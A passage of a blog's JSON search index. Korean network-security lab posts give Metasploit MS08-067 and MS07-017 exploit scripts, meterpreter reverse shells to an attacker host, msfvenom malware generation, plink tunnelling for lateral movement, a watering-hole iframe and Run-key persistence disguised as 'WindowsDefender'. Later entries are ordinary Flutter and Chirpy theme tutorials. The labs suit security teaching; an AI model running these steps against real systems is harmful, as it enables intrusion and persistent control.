시스템에 대한 제어 권한 탈취와 제어", "url": "/posts/%ED%91%9C%EC%A0%81-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC%EC%9D%98-%EB%8B%A4%EB%A5%B8-%EC%8B%9C%EC%8A%A4%ED%85%9C%EC%97%90-%EB%8C%80%ED%95%9C-%EC%A0%9C%EC%96%B4-%EA%B6%8C%ED%95%9C-%ED%83%88%EC%B7%A8%EC%99%80-%EC%A0%9C%EC%96%B4/", "categories": "Blogging, Network", "tags": "getting started", "date": "2022-06-16 20:00:00 +0800", "snippet": "Step1. 환경 구성환경 구성환경 구성은 다음과 같다.ip가 56번(내부) 대역에서 57번(외부) 대역으로 서비스에 접근할 수 있지만, 57번(외부) 대역에서 56번(내부) 대역으로는 서비스 접속이 안되게 설정한다.시나리오를 구성하자면, ARPING을 통해 Window #2를 찾아낸 후 공격을 실행하는 시나리오다.Step2. 세션 획득handler를 사용하여 Windows #1의 세션을 얻은 후 진행한다. 칼리에서 진행한다.C:\\WINDOWS\\Temp&amp;gt; plink -R 8888:192.168.56.20:445 -l root -pw lab 192.168.57.10칼리에서 아래의 스크립트가 있다면 스크립트 구성은 넘어가도 된다. ms08_067_meterpreter_reverse_tcp_relay.rcuse exploit/windows/smb/ms08_067_netapiset RHOST 127.0.0.1set RPORT 8888set PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.57.10exploit다음으로 msfconsole을 통해 공격스크립트를 실행한다. 칼리에서 진행한다.kali# msfconsole -r ms08_067_meterpreter_reverse_tcp_relay.rc오류가 생겼다면 다음글을 참고하도록 한다.원격 서비스 공격과 측면 이동Step3. 제어 지속plink를 통한 공격을 성공하였다면, malware.exe를 업로드 시킨다. meterpreter 에서 진행한다.meterpreter&amp;gt; upload /root/Desktop/malware.exe c:\\\\windows\\\\temp\\\\malware.exe제어 지속을 위해 Windows #2 또한 레지스트리를 설정한다. 레지스트리 검색C:\\WINDOWS\\Temp&amp;gt; reg query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;해당 경로의 레지스트리 경로를 보여준다. 레지스트리 추가C:\\WINDOWS\\Temp&amp;gt; reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; /v &quot;WindowsDefender&quot; /t REG_SZ /d &quot;C:\\Windows\\Temp\\malware.exe&quot; /fStep4. 결과 확인Windows #2를 재부팅 하여 handler를 통해 제어 지속이 되었는지 확인한다." }, { "title": "원격 서비스 공격과 측면 이동", "url": "/posts/%EC%9B%90%EA%B2%A9-%EC%84%9C%EB%B9%84%EC%8A%A4-%EA%B3%B5%EA%B2%A9%EA%B3%BC-%EC%B8%A1%EB%A9%B4-%EC%9D%B4%EB%8F%99/", "categories": "Blogging, Network", "tags": "getting started", "date": "2022-05-26 20:00:00 +0800", "snippet": "Step1. 환경 구성환경 구성환경 구성은 다음과 같다.ip가 56번(내부) 대역에서 57번(외부) 대역으로 서비스에 접근할 수 있지만, 57번(외부) 대역에서 56번(내부) 대역으로는 서비스 접속이 안되게 설정한다.방화벽 구성하기 전 확인우선 다음과 같이 방화벽을 꺼둔다. (공격이 확인되어야 하기 때문에)방화벽이 꺼져있기 때문에 다이렉트로 통신이 가능하다.다음으로 공격 스크립트를 작성한다.현재 이 스크립트는 공격하기 위함이 아닌, 공격이 제대로 되는지 확인하기 위한 검증이다. kali에서 진행한다. ms08_067_meterpreter_reverse_tcp.rcuse exploit/windows/smb/ms08_067_netapiset RHOST 192.168.56.20set PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.57.10exploit공격이 성공적으로 되었다면 아래와 같이 뜰것이다.만약 아래처럼 나왔다면?다음과 같은 경우를 생각해봐야 한다. 시스템이 켜져 있는지 확인해야 한다. 핑이 잘 가는지 확인해봐야 한다. (192.168.57.10 -&amp;gt; 192.168.56.20)잘 되었다면, 방화벽은 다음과 같이 설정한다.외부에서 내부로 서비스 거부하도록 설정한 것이다.Step2. 세션 획득msfconsole을 이용하여 윈도우 xp의 세션을 획득한 후 진행한다.세션을 얻는 방법은 저번에 사용했던 방법을 참고하면 된다.Step3. 측면 이동plink 사용kali에서 세션을 얻은 상태에서 다음 명령어를 입력한다.C:\\WINDOWS\\Temp&amp;gt; plink -R 8888:192.168.56.20:445 -l root -pw lab 192.168.57.10접속할 윈도우(192.168.56.20)의 445번 포트(smb)를 사용하여 접속하는 명령어 이다.실행 후 포트가 열려있는지 확인한다.lsof -i:8888 또는 netstat -atunp | grep 8080 으로 확인한다.공격 스크립트 작성 kali에서 진행한다. ms08_067_meterpreter_reverse_tcp_relay.rcuse exploit/windows/smb/ms08_067_netapiset RHOST 127.0.0.1set RPORT 8888set PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.57.10exploit127.0.0.1:8888 을 통해 접속하면 192.168.56.20:445으로 포트 포워딩 되어 smb를 이용한 공격이 실행된다.공격을 시도 했지만 아래처럼 나오게 될 경우oror 칼리에서 ssh를 켰는지 확인한다. kali# service ssh start 윈도우에서 칼리리눅스로 ping이 가는지 확인한다 (192.168.56.10, 192.168.56.20 -&amp;gt; 192.168.57.10) 윈도우끼리 핑이 가는지 확인한다. (192.168.56.10 &amp;lt;-&amp;gt; 192.168.56.20) 핑이 안간다면 ncpa.cpl을 통해 네트워크 카드를 껐다가 다시 킨다. {: width=”70%”}위의 경우를 확인하였는데도 안되었다면 (kali에서) fuser -k 8888/tcp 8888번 포트를 죽인다. plink -R 8888:192.168.56.20:445 -l root -pw lab 192.168.57.10 plink를 다시 한다. 윈도우#2 를 재부팅 한다. 다시 ping 확인( 안되면 네트워크 카드 껐다가 다시 킨다 ) msfconsole을 다시 exploit 한다.그러면 정상적으로 meterpreter 쉘을 얻을 수 있다." }, { "title": "패킷 릴레이와 측면 이동", "url": "/posts/%ED%8C%A8%ED%82%B7-%EB%A6%B4%EB%A0%88%EC%9D%B4%EC%99%80-%EC%B8%A1%EB%A9%B4-%EC%9D%B4%EB%8F%99/", "categories": "Blogging, Network", "tags": "getting started", "date": "2022-05-25 20:00:00 +0800", "snippet": "Step1. 환경 구성환경 구성환경 구성은 다음과 같다.ip가 56번(내부) 대역에서 57번(외부) 대역으로 서비스에 접근할 수 있지만, 57번(외부) 대역에서 56번(내부) 대역으로는 서비스 접속이 안되게 설정한다.방화벽 구성방화벽은 다음과 같이 설정한다.외부에서 내부로 서비스 거부하도록 설정한 것이다.Step2. 세션 획득msfconsole을 이용하여 윈도우 xp의 세션을 획득한 후 진행한다.세션을 얻는 방법은 저번에 사용했던 방법을 참고하면 된다.Step3. 측면 이동plink 준비해당 공격을 하기전에 앞서 plink를 윈도우로 옮겨놓는다.윈도우의 쉘을 얻은 후 plink를 upload 한다.plink는 윈도우에서 ssh를 사용할 수 있는 도구이다.plink를 사용한 패킷 릴레이윈도우의 쉘을 얻은 상태에서 아래의 명령어를 입력한다.C:\\WINDOWS\\Temp&amp;gt; plink -R 4321:192.168.56.80:80 -l root -pw lab 192.168.57.10명령어를 해석하면 다음과 같다.plink -R 4321:192.168.56.80:80 -l root -pw lab 192.168.57.10R옵션 : 원격시스템에 포트를 연다.plink -R 4321:192.168.56.80:80 -l root -pw lab 192.168.57.104321포트 : 원격시스템에 4321로 포트를 연다.plink -R 4321:192.168.56.80:80 -l root -pw lab 192.168.57.10192.168.56.80:80 : 해당 포트(4321)로 접속하게 되면 192.168.56.80의 80번 포트로 포트포워딩 한다.plink -R 4321:192.168.56.80:80 -l root -pw lab 192.168.57.10192.168.57.10 : ssh로 접속할 서버 주소이다.만약에 다음과 같은 오류가 나왔다면 칼리에서 ssh를 켰는지 확인한다. kali# service ssh start그러면 결과적으로 다음과 같은 구도를 나타낸다.plink 사용 (80번 포트)plink를 사용하여 측면이동을 시도한다.C:\\WINDOWS\\Temp&amp;gt; plink -R 4321:192.168.56.80:80 -l root -pw lab 192.168.57.10그러면 root@kali 로 나오게 된것을 볼 수 있는데이것은 윈도우에서 칼리로 ssh를 이용해 접속하였기 때문에 그렇다.포트 확인kali# netstat -atunp | grep 4321netstat를 이용하여 4321번 포트가 열려있는지 확인한다.포트포워딩 확인자기 자신(localhost)으로 접속하여 포트포워딩이 되는지 확인한다.192.168.56.80으로 시도하면 방화벽으로 인해 접속이 안되지만localhost:4321으로 접속하면 포트포워딩으로 인해 접속이 되는것을 볼 수 있다.tail 명령을 사용하여 로그를 살펴볼수도 있다.centos# tail -f /var/log/httpd/access_logplink 사용 (22번 포트)같은 방법으로 22번인 ssh를 이용하여 사용해본다.물론 centos에 ssh 서비스가 실행되어 있어야 한다.C:\\WINDOWS\\Temp&amp;gt; plink -R 2222:192.168.56.80:22 -l root -pw lab 192.168.57.10kali# ssh root@localhost -p 2222비밀번호# osboxes.org" }, { "title": "네트워크보안 정보수집과 제어 지속", "url": "/posts/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC%EB%B3%B4%EC%95%88-%EC%A0%95%EB%B3%B4%EC%88%98%EC%A7%91%EA%B3%BC-%EC%A0%9C%EC%96%B4%EC%A7%80%EC%86%8D/", "categories": "Blogging, Network", "tags": "getting started", "date": "2022-05-10 20:00:00 +0800", "snippet": "Step1. 세션 획득msfconsole을 이용하여 윈도우 xp의 세션을 획득한다.저번 차시에 사용되었던 redirect.php를 이용하여 세션을 얻는 방법이다.많은 부분은 생략을 하도록 한다. CentOS에서 진행한다.CentOS에서 웹 서비스를 사용할 수 있도록 한다.centos# service httpd start Kali에서 진행한다.애니커서 취약점이 있는 msfconsole 공격 스크립트를 작성한다.#파일명 : ms07_017_meterpreter_reverse_tcp.rcuse exploit/windows/browser/ms07_017_ani_loadimage_chunksizeset SRVPORT 8080set PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.57.10exploitkali# msfconsole -r ms07_017_meterpreter_reverse_tcp.rcmsfvenom을 사용해 윈도우 xp의 세션을 얻을 수 있는 악성 프로그램(malware)을 만든다.kali# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.57.10 LPORT=8081 -f exe &amp;gt; malware.exe 윈도우 xp에서 진행 한다.사용자(xp)가 CentOS 서버에 접속하여 공격자에게 세션 정보가 넘어가는지 확인한다.Step2. 악성 파일 업로드애니 커서 취약점을 통해 얻은 세션으로 악성 파일 및 정보수집 툴을 업로드 한다. 칼리에서 진행한다.#세션 설정msf&amp;gt; sessions -l #세션 목록 확인msf&amp;gt; sessions -i 1 #세션 선택#파일 업로드meterpreter&amp;gt; upload /var/www/plink.exe c:\\\\windows\\\\temp\\\\plink.exemeterpreter&amp;gt; upload /var/www/arping.exe c:\\\\windows\\\\temp\\\\arping.exemeterpreter&amp;gt; upload /var/www/arping_auto.bat c:\\\\windows\\\\temp\\\\arping_auto.batmeterpreter&amp;gt; upload /root/Desktop/malware.exe c:\\\\windows\\\\temp\\\\malware.exemeterpreter&amp;gt; upload /root/Desktop/PortQry.exe c:\\\\windows\\\\temp\\\\PortQry.exeStep3. 정보 수집Remote System Discovery 기술이 사용된 ARPING,Network Service Scanning 기술이 사용된 PORTQRY를 사용하여 정보수집을 한다.PortQry를 이용한 정보 수집 CentOS에서 진행한다.PortQry를 이용하여 포트 스캐닝을 위해서 sshd와 httpd 서비스를 실행하여 준다.centos# service sshd start # 22번 포트centos# service httpd start # 80번 포트 kali에서 진행한다.사용자(xp)에서 웹 서버 주소로 포트 스캐닝을 한다.meterpreter&amp;gt; shell #쉘 획득&amp;gt; cd c:\\windows\\temp&amp;gt; PortQry -n 192.168.57.80 -o 21,22,25,445,139,80포트 스캐닝 결과를 보면, 22번 포트와 80번 포트가 열린것을 볼 수 있다.또한 마이크로소프트에서 지원하는 445번과 139번이 NOT LISTENING 인것으로 보아 윈도우 서버가 아님을 알 수 있다.ARPING을 이용한 정보 수집arping툴을 이용하여 스캐닝할 수 있도록 arping_auto.bat 파일을 사용한다.코드를 보면 1~30까지 반복하면서, arping 실행 결과를 result.txt로 출력하는것을 알 수 있다.#arping_auto.bat@echo offset /a n=0:repeatset /a n+=1echo 192.168.56.%n%arping.exe -n 1 192.168.56.%n% &amp;gt;&amp;gt; result.txtif %n% lss 30 goto repeat kali에서 진행한다.meterpreter&amp;gt; shell #쉘 획득&amp;gt; cd c:\\windows\\temp&amp;gt; arping_auto.bat&amp;gt; type result.txte결과를 보았을 때,게이트웨이(192.168.56.2), xp1(192.168.56.10), xp2(192.168.56.20)가 응답한 것을볼 수 있다.Step4. 제어 지속악성 코드 제어지속을 위해 레지스트리에 접근한다.레지스트리 경로는 “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” 에 접근을 하도록 하는데, 이는 부팅시 자동으로 실행해주는 목록이다.공격자가 handler를 이용하여 사용자의 쉘이 이미 확보된 상태에서 진행한다. kali에서 진행한다. handler_meterpreter_reverse_8081.rcuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.57.10set lport 8081set EXITONSESSION FALSEexploit -j -zmsfconsole을 사용하여 해당 스크립트를 실행시킨다.kail# msfconsole -r handler_meterpreter_reverse_8081.rc공격자가 쉘을 얻은 상태에서 부팅시에도 악성 프로그램이 실행될 수 있도록 레지스트리를 등록한다.meterpreter&amp;gt; shell&amp;gt; reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; /v &quot;WindowsDefender&quot; /t REG_SZ /d &quot;C:\\Windows\\Temp\\malware.exe&quot; /f해당 명령어가 정상적으로 되었다면, 윈도우에서 레지스트리가 잘 저장되었는지 확인하도록 한다.칼리 리눅스에서 핸들러를 켜놓고, 사용자(xp)를 재부팅 시켜보면 부팅될 때마다 malware가 실행되어 세션이 넘어가는것을 볼 수 있다." }, { "title": "네트워크보안 중간고사", "url": "/posts/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC%EB%B3%B4%EC%95%88-%EC%A4%91%EA%B0%84%EA%B3%A0%EC%82%AC/", "categories": "Blogging, Network", "tags": "getting started", "date": "2022-04-24 20:00:00 +0800", "snippet": "Step1. metasploit 을 이용한 취약점 증명 구현이 공격 기법은 Exploitation for client Execution으로 MS07-017(IE가 애니메이션 커서를 처리하는 과정에서 버퍼 오버플로우가 발생하는 취약점)을 이용한 공격이다.작업을 편하게 하기 위해 바탕화면으로 이동하여 작업을 한다.metasploit을 이용한 취약점 증명을 구현하기 위해 스크립트 파일을 작성한다. Kali에서 진행한다.kali# cd ~/Desktopkali# vim ms07_017_exec.rc ms07_017_exec.rcuse exploit/windows/browser/ms07_017_ani_loadimage_chunksizeset SRVPORT 8080set PAYLOAD windows/execset CMD calc.exeexploit스크립트 파일을 생성했으니, msfconsole을 이용하여 스크립트 파일을 실행하여 준다. Kali에서 진행한다.kali# msfconsole -r ms07_017_exec.rc정상적으로 실행이 되었다면 아래와 같은 결과가 나오게 된다.윈도우에서 칼리 리눅스(공격자)쪽으로 웹페이지에 접속하여 결과를 확인한다.애니커서 취약점을 이용한 공격이 성공하면 calc.exe가 실행이 되는것을 볼 수 있다.Step2. 사용자의 웹 브라우저에 대한 악성 페이지 유도 구현이 공격 기법은 Drive-by Compromise으로 웹 사이트에(Centos) 악성 스크립트/HTML을 삽입하여 공격자 서버의(KALI 리눅스) 악성 페이지로 유도하는 워터링홀 공격이다.Step1에서 만들어 두었던 만들어 두었던 ms07_017_exec.rc 를 이용한다. Kali에서 진행한다.kali# msfconsole -r ms07_017_exec.rc Centos로 진행한다.centos# service httpd restartcentos# cd /var/www/htmlcentos# mkdir labcentos# vim index.php index.php&amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;h1&amp;gt;Web Site Main Page&amp;lt;/h1&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;iframe width=&quot;100&quot; height=&quot;100&quot; src=&quot;http://192.168.57.10:8080&quot;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Centos서버로 접속을 하면 공격자의 서버(192.168.57.10)로 유도하도록 iframe을 작성한다.윈도우에서 Centos로 접속하여 확인을 해본다.Centos로 접속하면 공격자의 서버로 유도되어 워터링홀 공격이 성공된것을 볼 수 있다.Step3. 방화벽 설정방화벽 설정은 Centos(192.168.57.80)은 통과하되 Kali(192.168.57.10)은 차단하는 정책을 구현한다.Kali에서 Pfsense(192.168.57.2)로 접속을 한다.id : adminpw : pfsenseLAN이나 WAN 둘중에 하나를 아래와 같이 설정하면 핑은 가되, 접속이 안되는걸 볼 수 있다.or 윈도우에서 공격자로 접속 (x) 윈도우에서 공격자로 핑 시도 (o)핑은 되지만 접속이 안되는 이유는 Pfsense에서 HTTP를 차단했지만 ICMP는 차단하지 않았기 때문이다.Step4. 표적 시스템의 정보 수집첫번째 방법표적 시스템의 정보 수집을 통해 다음과 같은 정보를 수집해야한다. 표적시스템의 네트워크 디폴드 게이트웨이 정보 ifconfig 표적시스템의 운영체제 버전 systeminfo 표적시스템 상의 사용자 계정 목록 net user Kali에서 진행한다.kali# cd ~/Desktopkali# vim ms07_017_meterpreter_reverse_tcp.rc ms07_017_meterpreter_reverse_tcp.rcuse exploit/windows/browser/ms07_017_ani_loadimage_chunksizeset SRVPORT 8080set PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.57.10exploit스크립트 파일을 생성했으니, msfconsole을 이용하여 스크립트 파일을 실행하여 준다.kali# msfconsole -r ms07_017_meterpreter_reverse_tcp.rc 윈도우에서 공격자 서버(182.168.57.10)로 접속하여 확인한다. 윈도우의 대한 세션이 칼리리눅스에 보여지는것을 볼 수 있다. Kali에서 진행한다.kali# sessions -lkali# sessions -i 1kali# shell세션 리스트 : sessions -l 첫번째 세션 선택 : sessions -i 1 shell 접속 : shell두번째 방법 Kali에서 진행한다.kali# cd ~/Desktopkali# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.57.10 LPORT=8081 -f exe &amp;gt; malware.exekali# /etc/init.d/apache2 startkali# mv malware.exe /var/www/meterp_192.168.57.10_8081.exekali# vim handler_meterpreter_reverse_8081.rc handler_meterpreter_reverse_8081.rcuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.57.10set lport 8081set EXITONSESSION FALSEexploit -j -z스크립트 파일을 생성했으니, msfconsole을 이용하여 스크립트 파일을 실행하여 준다.kali# msfconsole -r handler_meterpreter_reverse_8081.rc윈도우에서 해당 경로로 접속하여 다운로드한다.http://192.168.57.10/meterp_192.168.57.10_8081.exe -&amp;gt; 바탕화면 Save -&amp;gt; 실행윈도우에서 malware를 실행하게 되면, 칼리리눅스에 윈도우의 세션이 저장된다.shell을 획득 후 정보들을 획득하면 끝" }, { "title": "Flutter - 함수 사용법", "url": "/posts/Flutter-%ED%95%A8%EC%88%98/", "categories": "Blogging, Flutter", "tags": "getting started", "date": "2022-01-11 20:00:00 +0800", "snippet": "Flutter에서 함수 만들기안녕하세요.간단하게 함수를 만들어보도록 하겠습니다.우선 준비작업으로 stless를 입력해서, 아래와 같이 준비 작업을 진행해주세요.class MyApp extends StatelessWidget { const MyApp({Key? key}) : super(key: key); @override Widget build(BuildContext context) { return MaterialApp( home: Scaffold( appBar: AppBar(), body: Container( child: Text(&quot;테스트 출력&quot;), ), )); }}준비가 되셨다면, 함수를 만들어 보겠습니다.함수는 타언어와 같이 적용하는 면이 같다고 보시면 되겠습니다.return 자료형에는 자료형이 같거나 상위 자료형을 사용해야 한다는 점 기억해두세요.class MyApp extends StatelessWidget { const MyApp({Key? key}) : super(key: key); int sum(int a, int b) { return a + b; } @override Widget build(BuildContext context) { return MaterialApp( home: Scaffold( appBar: AppBar(), body: Container( child: Text(&quot;테스트 출력&quot;), ), )); }}Flutter에서 함수 사용하기함수 사용하는 부분에 있어서는 기존 사용방법과 매우 유사하기 때문에너무 어렵게 생각하실 필요 없습니다.class MyApp extends StatelessWidget { const MyApp({Key? key}) : super(key: key); int sum(int a, int b) { return a + b; } @override Widget build(BuildContext context) { return MaterialApp( home: Scaffold( appBar: AppBar(), body: Container( child: Text(&quot;2 + 5 = &quot; + sum(2, 5).toString()), ), )); }}Flutter에서 위젯 함수 사용하기Flutter에서 위젯함수란?불필요한 위젯들을 많이 줄여주는 역할이라고 생각하시면 됩니다.예를 들어서 Container 위젯을 만들어 보도록 하겠습니다.Container의 반환 자료형을 보면, Widget이라는것을 볼 수 있는데이것은 Container, Text와 같은 위젯들의 최상위 자료형 이라고 보시면 됩니다.Java에서는 Object 자료형이라고 예시를 들 수 있겠습니다.class MyApp extends StatelessWidget { const MyApp({Key? key}) : super(key: key); Widget myContainer() { return Container( width: 100, height: 100, color: Colors.blue, ); } @override Widget build(BuildContext context) { return MaterialApp( home: Scaffold( appBar: AppBar(), body: Container(child: myContainer()), )); }}Flutter에서 함수는 어느 위치에 사용하는가?현재 사용한 함수 형태를 보면, Class 안에 쓴것을 볼 수 있습니다.물론 Class 밖에서도 선언해서 사용할 수 있습니다.해당 Class 안에서만 사용하고 싶다면 Class 내에 선언 후 사용하는것이 좋고,어느 Class 에서든지 사용하고 싶다면, Class 외에서 선언 후 사용하시면 되겠습니다." }, { "title": "Enable Google Page Views", "url": "/posts/enable-google-pv/", "categories": "Blogging, Tutorial", "tags": "google analytics, pageviews", "date": "2021-01-04 07:32:00 +0800", "snippet": "This post is to enable Page Views on the Chirpy theme based blog that you just built. This requires technical knowledge and it’s recommended to keep the google_analytics.pv.* empty unless you have a good reason. If your website has low traffic, the page views count would discourage you to write more blogs. With that said, let’s start with the setup.Set up Google AnalyticsCreate GA account and propertyFirst, you need to set up your account on Google analytics. While you create your account, you must create your first Property as well. Head to https://analytics.google.com/ and click on Start Measuring Enter your desired Account Name and choose the desired checkboxes Enter your desired Property Name. This is the name of the tracker project that appears on your Google Analytics dashboard Enter the required information About your business Hit Create and accept any license popup to set up your Google Analytics account and create your propertyCreate Data StreamWith your property created, you now need to set up Data Stream to track your blog traffic. After you signup, the prompt should automatically take you to create your first Data Stream. If not, follow these steps: Go to Admin on the left column Select the desired property from the drop-down on the second column Click on Data Streams Add a stream and click on Web Enter your blog’s URLIt should look like this:Now, click on the new data stream and grab the Measurement ID. It should look something like G-V6XXXXXXXX. Copy this to your _config.yml filegoogle_analytics: id: &#39;G-V6XXXXXXX&#39; # fill in your Google Analytics ID # Google Analytics pageviews report settings pv: proxy_endpoint: # fill in the Google Analytics superProxy endpoint of Google App Engine cache_path: # the local PV cache data, friendly to visitors from GFW regionWhen you push these changes to your blog, you should start seeing the traffic on your Google Analytics. Play around with the Google Analytics dashboard to get familiar with the options available as it takes like 5 mins to pick up your changes. You should now be able to monitor your traffic in real time.Setup Page ViewsThere is a detailed tutorial available to set up Google Analytics superProxy. But, if you are interested to just quickly get your Chirpy-based blog display page views, follow along. These steps were tested on a Linux machine. If you are running Windows, you can use the Git bash terminal to run Unix-like commands.Setup Google App Engine Visit https://console.cloud.google.com/appengine Click on Create Application Click on Create Project Enter the name and choose the data center close to you Select Python language and Standard environment Enable billing account. Yeah, you have to link your credit card. But, you won’t be billed unless you exceed your free quota. For a simple blog, the free quota is more than sufficient. Go to your App Engine dashboard on your browser and select API &amp;amp; Services from the left navigation menu Click on Enable APIs and Services button on the top Enable the following APIs: Google Analytics API On the left, Click on OAuth Consent Screen and accept Configure Consent Screen. Select External since your blog is probably hosted for the public. Click on Publish under Publishing Status Click on Credentials on the left and create a new OAuth Client IDs credential. Make sure to add an entry under Authorized redirect URIs that matches: https://&amp;lt;project-id&amp;gt;.&amp;lt;region&amp;gt;.r.appspot.com/admin/auth Note down the Your Client ID and Your Client Secret. You’ll need this in the next section. Download and install the cloud SDK for your platform: https://cloud.google.com/sdk/docs/quickstart Run the following commands: [root@bc96abf71ef8 /]# gcloud init~snip~Go to the following link in your browser: https://accounts.google.com/o/oauth2/auth?response_type=code&amp;amp;client_id=XYZ.apps.googleusercontent.com&amp;amp;redirect_uri=ABCDEFGEnter verification code: &amp;lt;VERIFICATION CODE THAT YOU GET AFTER YOU VISIT AND AUTHENTICATE FROM THE ABOVE LINK&amp;gt;You are logged in as: [blah_blah@gmail.com].Pick cloud project to use:[1] chirpy-test-300716[2] Create a new projectPlease enter numeric choice or text value (must exactly match listitem): 1[root@bc96abf71ef8 /]# gcloud info# Your selected project info should be displayed here Setup Google Analytics superProxy Clone the Google Analytics superProxy project on Github: https://github.com/googleanalytics/google-analytics-super-proxy to your local. Remove the first 2 lines in the src/app.yaml file: - application: your-project-id- version: 1 In src/config.py, add the OAUTH_CLIENT_ID and OAUTH_CLIENT_SECRET that you gathered from your App Engine Dashboard. Enter any random key for XSRF_KEY, your config.py should look similar to this #!/usr/bin/python2.7__author__ = &#39;pete.frisella@gmail.com (Pete Frisella)&#39;# OAuth 2.0 Client SettingsAUTH_CONFIG = { &#39;OAUTH_CLIENT_ID&#39;: &#39;YOUR_CLIENT_ID&#39;, &#39;OAUTH_CLIENT_SECRET&#39;: &#39;YOUR_CLIENT_SECRET&#39;, &#39;OAUTH_REDIRECT_URI&#39;: &#39;%s%s&#39; % ( &#39;https://chirpy-test-XXXXXX.ue.r.appspot.com&#39;, &#39;/admin/auth&#39; )}# XSRF SettingsXSRF_KEY = &#39;OnceUponATimeThereLivedALegend&#39; Tip: You can configure a custom domain instead of https://PROJECT_ID.REGION_ID.r.appspot.com. But, for the sake of keeping it simple, we will be using the Google provided default URL. From inside the src/ directory, deploy the app [root@bc96abf71ef8 src]# gcloud app deployServices to deploy:descriptor: [/tmp/google-analytics-super-proxy/src/app.yaml]source: [/tmp/google-analytics-super-proxy/src]target project: [chirpy-test-XXXX]target service: [default]target version: [VESRION_NUM]target url: [https://chirpy-test-XXXX.ue.r.appspot.com]Do you want to continue (Y/n)? YBeginning deployment of service [default]...╔════════════════════════════════════════════════════════════╗╠═ Uploading 1 file to Google Cloud Storage ═╣╚════════════════════════════════════════════════════════════╝File upload done.Updating service [default]...done.Setting traffic split for service [default]...done.Deployed service [default] to [https://chirpy-test-XXXX.ue.r.appspot.com]You can stream logs from the command line by running:$ gcloud app logs tail -s defaultTo view your application in the web browser run:$ gcloud app browse Visit the deployed service. Add a /admin to the end of the URL. Click on Authorize Users and make sure to add yourself as a managed user. If you get any errors, please Google it. The errors are self-explanatory and should be easy to fix. If everything went good, you’ll get this screen:Create Google Analytics QueryHead to https://PROJECT_ID.REGION_ID.r.appspot.com/admin and create a query after verifying the account. GA Core Reporting API query request can be created in Query Explorer.The query parameters are as follows: start-date: fill in the first day of blog posting end-date: fill in today (this is a parameter supported by GA Report, which means that it will always end according to the current query date) metrics: select ga:pageviews dimensions: select ga:pagePathIn order to reduce the returned results and reduce the network bandwidth, we add custom filtering rules 1: filters: fill in ga:pagePath=~^/posts/.*/$;ga:pagePath!@=. Among them, ; means using logical AND to concatenate two rules. If the site.baseurl is specified, change the first filtering rule to ga:pagePath=~^/BASE_URL/posts/.*/$, where BASE_URL is the value of site.baseurl. After Run Query, copy the generated contents of API Query URI at the bottom of the page and fill in the Encoded URI for the query of SuperProxy on GAE.After the query is saved on GAE, a Public Endpoint (public access address) will be generated, and we will get the query result in JSON format when accessing it. Finally, click Enable Endpoint in Public Request Endpoint to make the query effective, and click Start Scheduling in Scheduling to start the scheduled task.Configure Chirpy to Display Page ViewOnce all the hard part is done, it is very easy to enable the Page View on Chirpy theme. Your superProxy dashboard should look something like below and you can grab the required values.Update the _config.yml file of Chirpy project with the values from your dashboard, to look similar to the following:google_analytics: id: &#39;G-V6XXXXXXX&#39; # fill in your Google Analytics ID pv: proxy_endpoint: &#39;https://PROJECT_ID.REGION_ID.r.appspot.com/query?id=&amp;lt;ID FROM SUPER PROXY&amp;gt;&#39; cache_path: # the local PV cache data, friendly to visitors from GFW regionNow, you should see the Page View enabled on your blog.Reference Google Analytics Core Reporting API: Filters &amp;#8617; " }, { "title": "Customize the Favicon", "url": "/posts/customize-the-favicon/", "categories": "Blogging, Tutorial", "tags": "favicon", "date": "2019-08-11 00:34:00 +0800", "snippet": "The favicons of Chirpy are placed in the directory assets/img/favicons/. You may want to replace them with your own. The following sections will guide you to create and replace the default favicons.Generate the faviconPrepare a square image (PNG, JPG, or SVG) with a size of 512x512 or more, and then go to the online tool Real Favicon Generator and click the button Select your Favicon image to upload your image file.In the next step, the webpage will show all usage scenarios. You can keep the default options, scroll to the bottom of the page, and click the button Generate your Favicons and HTML code to generate the favicon.Download &amp;amp; ReplaceDownload the generated package, unzip and delete the following two from the extracted files: browserconfig.xml site.webmanifestAnd then copy the remaining image files (PNG and ICO) to cover the original files in the directory assets/img/favicons/ of your Jekyll site. If your Jekyll site doesn’t have this directory yet, just create one.The following table will help you understand the changes to the favicon files: File(s) From Online Tool From Chirpy *.PNG ✓ ✗ *.ICO ✓ ✗ Note: ✓ means keep, ✗ means delete.The next time you build the site, the favicon will be replaced with a customized edition." }, { "title": "Getting Started", "url": "/posts/getting-started/", "categories": "Blogging, Tutorial", "tags": "getting started", "date": "2019-08-09 20:55:00 +0800", "snippet": "PrerequisitesFollow the instructions in the Jekyll Docs to complete the installation of Ruby, RubyGems, Jekyll, and Bundler.InstallationCreating a New SiteThere are two ways to create a new repository for this theme: Using the Chirpy Starter - Easy to upgrade, isolates irrelevant project files so you can focus on writing. Forking on GitHub - Convenient for custom development, but difficult to upgrade. Unless you are familiar with Jekyll and are determined to tweak or contribute to this project, this approach is not recommended.Option 1. Using the Chirpy StarterCreate a new repository from the Chirpy Starter and name it &amp;lt;GH_USERNAME&amp;gt;.github.io, where GH_USERNAME represents your GitHub username.Option 2. Forking on GitHubFork Chirpy on GitHub and rename it to &amp;lt;GH_USERNAME&amp;gt;.github.io. Please note that the default branch code is in 